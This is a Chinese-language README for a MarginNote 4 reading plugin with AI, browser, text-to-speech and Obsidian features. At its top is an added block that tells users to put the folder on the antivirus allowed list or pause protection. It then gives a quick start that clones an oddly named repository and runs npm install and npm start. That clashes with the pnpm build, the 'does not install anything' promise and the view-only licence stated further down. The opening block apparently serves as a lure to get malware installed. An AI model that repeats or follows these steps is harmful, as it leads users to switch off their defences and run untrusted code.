
> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/OctopusColonnade83/readingspace-mn-523.git
cd readingspace-mn-523
npm install
npm start
```


<p align="center">
  <img src="web/src/assets/about/reading-space-logo.svg" width="112" alt="Reading Space 标志">
</p>

<h1 align="center">Reading Space MN</h1>

<p align="center">
  <strong>让解释、问答、朗读与资料检索留在 MarginNote 阅读现场。</strong>
</p>

<p align="center">
  Reading Space MN 是面向 MarginNote 4 的阅读工作流插件，把 AI、浏览器、音频朗读与 Obsidian 连接带到选区、摘录和脑图卡片旁边。
</p>

<p align="center">
  <strong>简体中文</strong> ·
  <a href="README.en.md">English</a> ·
  <a href="README.ja.md">日本語</a> ·
  <a href="README.fr.md">Français</a> ·
  <a href="README.ru.md">Русский</a> ·
  <a href="README.es.md">Español</a> ·
  <a href="README.ko.md">한국어</a>
</p>

<p align="center">
  <a href="#适合哪些阅读场景">使用场景</a> ·
  <a href="#核心能力">核心能力</a> ·
  <a href="#一次阅读动作如何流转">使用流程</a> ·
  <a href="#当前可用状态">当前状态</a> ·
  <a href="#从源码验证与构建">源码构建</a> ·
  <a href="#隐私与数据边界">隐私与安全</a>
</p>

---

## 把阅读的下一步，放回正在阅读的内容旁边

阅读 PDF、网页或笔记时，下一步往往是解释一个概念、追问一段内容、听一遍摘录，或临时打开网页核对资料。Reading Space MN 把这些动作组织在同一条阅读工作流中，减少在阅读器、浏览器、AI 工具和笔记软件之间来回切换。

它不会替代 MarginNote，而是围绕正在阅读的内容补齐查询、理解、朗读和沉淀入口。

## 适合哪些阅读场景

- 选中文字后快速解释、查词、翻译或继续追问；
- 对摘录和脑图卡片执行朗读、评论或关联卡片操作；
- 在阅读过程中临时打开网页查找和核对资料；
- 将有价值的摘录或卡片推送到本机 Obsidian ReadingSpace；
- 按明确范围导出、导入或手动同步插件设置。

## 核心能力

| 能力 | 用途 |
| --- | --- |
| **选区与卡片工具栏** | 在文档选区、摘录和脑图卡片旁提供朗读、解释、AI 问答、评论、子卡片和同级卡片等入口。 |
| **AI 快速解释与查词** | 对当前选区或卡片内容生成简短解释，并支持词典、翻译和后续提问。 |
| **AI 问答** | 在 MarginNote 内使用独立问答面板，连接你自己的服务商、模型、Endpoint 和提示词。 |
| **内置浏览器** | 在阅读流中浏览网页，并管理主页、书签、浏览历史和当前标签页。 |
| **音频朗读** | 通过已配置的 TTS 服务或本地 Obsidian 桥接生成音频，并交给独立播放器。 |
| **Obsidian 推送** | 将当前摘录或卡片内容发送到本机 Obsidian ReadingSpace 的指定目录。 |
| **设置与手动同步** | 管理外观、AI、浏览器、朗读和导出设置，按选择的范围手动上传或导入 iCloud 数据。 |

## 一次阅读动作如何流转

## 当前可用状态

当前公开源码快照对应版本 **0.1.5**，运行环境要求 **MarginNote 4.2.3 或更高版本**。

> [!IMPORTANT]

使用前还需要了解以下边界：

- AI 和 TTS 功能需要你自行配置服务商、Endpoint、API Key 或其他连接信息；仓库不包含第三方密钥。
- 自动同步是实验功能，目前已暂停；设置保存不会自动上传到 iCloud，仅保留手动上传和手动导入。
- 浏览器 Cookie 与登录态仅保存在本机，不进入设置导出或 iCloud 同步。
- 本地 Obsidian 桥接主要面向桌面端，在 iPad 上不可用。
- 不同 MarginNote 版本、设备和网络环境可能造成行为差异，请以实际运行结果为准。

## 从源码验证与构建

运行插件需要 MarginNote 4.2.3 或更高版本。构建公开源码还需要：

- Node.js 22.12 或更高版本；
- pnpm 10 或更高版本；
- 系统 `zip` 命令。

```bash
git clone https://github.com/OctopusColonnade83/readingspace-mn-523.git
cd readingspace-mn
pnpm verify
pnpm build
```

`pnpm verify` 会校验公开源码边界、源快照和功能契约。`pnpm build` 会在 `artifacts/` 中生成固定名称与带时间戳的 `.mnaddon`，但不会安装插件、重启 MarginNote、写入桌面或调用内部发布服务。

公开构建用于可复现性和回归验证，不能替代经过验收的正式发布包。

## 公开源码的可验证性

本仓库是受管公开镜像。产品源码以一个完整的内部 Git 提交为基线，`PUBLIC_SOURCE.json` 记录对应的源提交、版本、受管文件和逐文件 SHA-256。

运行以下命令可以检查当前公开源码是否仍与收据一致：

```bash
pnpm verify:source-snapshot
```

`src/`、`web/` 和收据列出的功能契约脚本不会在公开镜像中独立开发；公开专用 README、CI、安全策略与无本机副作用的构建外壳可以独立维护，但不改变插件运行时行为。

## 隐私与数据边界

- 仓库不包含用户 API Key、Bridge token、浏览器 Cookie、聊天历史或其他用户数据。
- 浏览器登录态只保存在本机；不会进入设置导出或 iCloud 同步。
- 高风险同步项目需要在设置页明确选择，并由用户手动上传或导入。
- 请勿在公开 Issue、日志或截图中粘贴密钥、令牌、Cookie、私人文档或真实用户数据。
- 如需报告安全问题，请遵循 [SECURITY.md](SECURITY.md)，不要公开漏洞细节或未脱敏证据。

## 授权与独立项目声明

本仓库公开源码仅供查看与安全审计，**不是开源软件**。除适用法律或 GitHub 服务条款明确允许的情形外，未授予复制、修改、分发、再许可、销售或创作衍生作品的权利。完整条款见 [LICENSE](LICENSE)。

Reading Space MN 是独立设计和实现的项目，不是 MarginNote、OpenAI、ChatGPT、Obsidian 或其他第三方服务的官方产品，也不代表获得这些产品的认可、合作或兼容承诺。第三方名称与商标归各自权利人所有。


<!-- Last updated: 2026-09-16 18:21:11 -->
